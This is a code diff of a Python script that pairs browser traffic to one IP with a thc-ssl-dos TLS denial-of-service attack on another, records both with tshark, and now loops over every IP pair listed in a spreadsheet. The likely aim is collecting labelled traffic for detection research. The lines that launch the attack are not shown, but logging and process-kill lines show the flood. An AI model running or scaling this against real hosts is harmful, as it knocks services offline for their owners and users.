@@ -38,22 +38,6 @@ excel_dir_dos = "./report_unique_dos.xlsx"
 print("Reading from excel file now for the list of sites to test...")
 df = pd.read_excel(excel_dir, sheet_name="complete_list")
 df_dos = pd.read_excel(excel_dir_dos, sheet_name="thc-tls-dos")
-
-#parser = argparse.ArgumentParser()
-#parser.add_argument('-s', '--start', help='Start index of the csv file')
-#parser.add_argument('-e', '--end', help='End index of the csv file')
-#args = parser.parse_args()
-
-#if len(sys.argv) <= 2:
-#    print("Usage: <start_index> <end_index>")
-#    exit(1)
-
-#start_index = int(args.start)
-#end_index = int(args.end)
-
-# To be applied to the CSV file
-#s = slice(start_index, end_index)
-
 dictionary = {}
 dictionary_dos = {}
 ip_list_normal = df['IP']
@@ -145,21 +129,6 @@ def normal(ip):
         for link in soup.find_all('a', href=True):
             if "javascript" not in link or "#" not in link:
                 cleanLinks.append(link["href"])
-
-        # SNIFFER
-        # Declaring variables for the sniffer
-        # Capture filter ip_list[0] is taken as the first IP resolved to capture
-        # Might not be too perfect in the case
-        #abspath = os.path.abspath(file_path)
-        #interface = "eth0"
-        #capture_filter = "tcp port 443 and host " + ip
-        #filename = abspath + "\\" + domain + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
-
-        # Raw capturing
-        # command = ["tshark", "-i", interface, "-a", "duration:120", "-f", capture_filter, "-w", filename]
-        #command = ["tshark", "-i", interface, "-c", "5000", "-f", capture_filter, "-w", filename]
-        #sts = subprocess.Popen(command, shell=False)
-        #time.sleep(5)
         
         try:
             driver.get(domain_urllib)
@@ -288,11 +257,10 @@ def normal(ip):
         logging.error(str(NE))
         driver.close()  
 
-
 def attack(ip):
     while isNormal == 0 : 
         time.sleep(1)
-    print('chrome driver has started..')
+    print('ready to attack at ' + str(ip))
 
     # Initializer for thc-ssl-dos
     # Declaring variables for thc-ssl-dos
@@ -305,7 +273,7 @@ def attack(ip):
     logging.info("Opened DOS attack at " + ip)
 
     # Sleeping for 25 seconds before killing them off
-    time.sleep(60)
+    time.sleep(25)
     kill_thc = "killall -s SIGTERM thc-ssl-dos"
     kill_sniff = "killall -s SIGTERM  tshark"
     os.system(kill_thc)
@@ -342,45 +310,61 @@ if __name__ == '__main__' :
     file_path = os.path.join("output/mixed_traffic/" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
     if not os.path.exists(file_path):
         os.makedirs(file_path)
-
-    ip_normal = ip_list_normal[0]
-    ip_dos = ip_list_dos[0]
-    isAttacking = 1
-    isNormal = 0
+####################for single testing########################################
+    #ip_normal = ip_list_normal[0]
+    #ip_dos = ip_list_dos[0]
+    #isAttacking = 1
+    #isNormal = 0
         # SNIFFER
         # Declaring variables for the sniffer
         # Capture filter ip_list[0] is taken as the first IP resolved to capture
         # Might not be too perfect in the case
-    abspath = os.path.abspath(file_path)
-    interface = "eth0"
-    capture_filter = "tcp port 443 and host " + ip_normal + " or " + ip_dos
-    filename = abspath + "/" + ip_normal + "_" + ip_dos + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
-
-        # Raw capturing
-        # command = ["tshark", "-i", interface, "-a", "duration:120", "-f", capture_filter, "-w", filename]
+    #abspath = os.path.abspath(file_path)
+    #interface = "eth0"
+    #capture_filter = "tcp port 443 and host " + ip_normal + " or " + ip_dos
+    #filename = abspath + "/" + ip_normal + "_" + ip_dos + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
+    # Raw capturing
     #command = ["tshark", "-i", interface, "-c", "5000", "-f", capture_filter, "-w", filename]
-    command = ["tshark", "-i", interface, "-f", capture_filter, "-w", filename]
-    sts = subprocess.Popen(command, shell=False)
-    time.sleep(5)
+    #command = ["tshark", "-i", interface, "-f", capture_filter, "-w", filename]
+    #sts = subprocess.Popen(command, shell=False)
+    #time.sleep(5)
 
-    normal = threading.Thread(target=normal, args=(ip_normal,))
-    normal.start()
-    attack = threading.Thread(target=attack, args=(ip_dos,))
-    attack.start()
+    #normal = threading.Thread(target=normal, args=(ip_normal,))
+    #normal.start()
+    #attack = threading.Thread(target=attack, args=(ip_dos,))
+    #attack.start()
+##############################################################################
 
+    for i in range(length):
+        ip_dos = ip_list_dos[i]
+        ip_normal = ip_list_normal[i]
+        print("normal at " + ip_normal)
+        print("ddos at " + ip_dos)
 
-    #for i in range(length):
-     #   ip_dos = ip_list_dos[i]
-      #  ip_normal = ip_list_normal[i]
+        isAttacking = 1
+        isNormal = 0
+        # SNIFFER
+        # Declaring variables for the sniffer
+        # Capture filter ip_list[0] is taken as the first IP resolved to capture
+        # Might not be too perfect in the case
+        abspath = os.path.abspath(file_path)
+        interface = "eth0"
+        capture_filter = "tcp port 443 and host " + ip_normal + " or " + ip_dos
+        filename = abspath + "/" + ip_normal + "_" + ip_dos + "_" + datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".pcap"
+        # Raw capturing
+        #command = ["tshark", "-i", interface, "-c", "5000", "-f", capture_filter, "-w", filename]
+        command = ["tshark", "-i", interface, "-f", capture_filter, "-w", filename]
+        sts = subprocess.Popen(command, shell=False)
+        time.sleep(5)
 
-       # normal = threading.Thread(target=normal, args=(ip_normal,))
-        #normal.start()
-        #sleep(60)
-        #attack = threading.Thread(target=attack, args=(ip_dos,))
-        #attack.start()
-        #while isAttacking == 1 :
-        #    print("still attacking...")
-        #print("waiting for normal and attack to shut down...")
-        #sleep(30)
-        #global isAttacking
-        #isAttacking = 1
+        normal_t = threading.Thread(target=normal, args=(ip_normal,))
+        normal_t.start()
+        attack_t = threading.Thread(target=attack, args=(ip_dos,))
+        attack_t.start()
+
+        while isAttacking == 1 :
+            time.sleep(2)
+        print('attack has stopped..')
+        normal_t.join()
+        attack_t.join()
+        
